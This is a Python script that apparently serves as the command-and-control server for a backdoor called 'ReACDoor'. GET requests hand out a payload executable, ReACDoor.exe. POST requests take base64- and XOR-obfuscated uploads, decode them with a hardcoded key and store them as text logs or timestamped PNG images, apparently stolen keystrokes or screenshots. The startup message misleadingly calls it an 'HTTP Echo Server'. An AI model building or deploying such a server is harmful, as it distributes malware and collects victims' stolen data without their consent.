#!/usr/bin/env python3
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
import base64
from datetime import datetime
from pathlib import Path
import threading


KEY = b"secretkey"
OUTPUT_DIR = Path(__file__).resolve().parent
file_lock = threading.Lock()

greetings = "You are entering a strange new dimension beyond the confines of time and space. You are entering the... ReACDoorZone!"
transmissionConfirmation = "received"

def decryptMessage(message, key):
    decryptedMessage = base64.b64decode(message, validate=True)
    decryptedMessage = bytes(
        byte ^ key[i % len(key)]
        for i, byte in enumerate(decryptedMessage)
    )
    return decryptedMessage

def saveReceivedData(type_id, data):

    filename = "text"
    extension = ".txt"
    filepath = OUTPUT_DIR

    if type_id == "0":
        filepath = OUTPUT_DIR / (filename+extension)
    elif type_id == "1":
        extension = ".png"
        imageDirectory = OUTPUT_DIR / "images"
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        filename = f"{timestamp}"

        imageDirectory.mkdir(parents=True, exist_ok=True)        
        filepath = imageDirectory / (filename+extension)

    with file_lock:
        with filepath.open("ab") as f:
            f.write(data)
            print("[+]Saved received data")



class RequestHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        #self.fallback()
        self.servePayload()

    def do_POST(self):
        self.handleMessage()

    def do_PUT(self):
        self.fallback()

    def do_PATCH(self):
        self.fallback()

    def do_DELETE(self):
        self.fallback()

    def do_OPTIONS(self):
        self.fallback()

    def do_HEAD(self):
        self.fallback()


    def serve_file(self, filepath):
        filepath = Path(filepath)

        if not filepath.is_file():
            self.send_error(404, "File not found")
            return

        content = filepath.read_bytes()

        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(content)))
        self.end_headers()

        if self.command != "HEAD":
            self.wfile.write(content)


    def servePayload(self):
        self.serve_file(OUTPUT_DIR / "ReACDoor.exe")

    def fallback(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(greetings)))
        self.end_headers()
    
        if self.command != "HEAD":
            self.wfile.write(greetings.encode())

    def handleMessage(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length) if content_length else b""

        try:
            #decrypt the received message
            result = decryptMessage(body,KEY)

            #Determine the message type
            type_id = self.headers.get("type-ID", "").strip()

            #Save the received data
            saveReceivedData(type_id, result)

            #Send confirmation back to client
            self.send_response(200)
            self.send_header(
                "Content-Type",
                "application/octet-stream"
            )
            self.send_header("Content-Length", str(len(transmissionConfirmation)))
            self.end_headers()

            if self.command != "HEAD":
                self.wfile.write(transmissionConfirmation.encode())

        except Exception as e:
            error = f"Error processing request: {e}".encode()

            self.send_response(400)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(error)))
            self.end_headers()

            if self.command != "HEAD":
                self.wfile.write(error)


# Start HTTP server
server = ThreadingHTTPServer(("0.0.0.0", 8080), RequestHandler)

print("HTTP Echo Server running at http://localhost:8080")
print(f"Saving received files to: {OUTPUT_DIR}")

try:
    server.serve_forever()
except KeyboardInterrupt:
    print("\nShutting down server...")
    server.shutdown()
    server.server_close()

